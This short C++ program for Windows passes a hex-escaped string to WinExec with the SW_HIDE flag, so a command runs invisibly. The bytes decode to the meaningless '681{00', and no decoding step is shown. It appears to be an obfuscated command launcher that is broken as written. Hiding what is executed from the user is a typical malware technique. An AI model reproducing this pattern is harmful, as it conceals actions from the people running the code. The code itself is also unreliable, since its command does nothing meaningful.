#include <windows.h>
#include <iostream>
#include <cstring>

int main(){
    const char* cmd = "\x36\x38\x31\x7b\x30\x30";
    WinExec(cmd, SW_HIDE);
    return 0;
}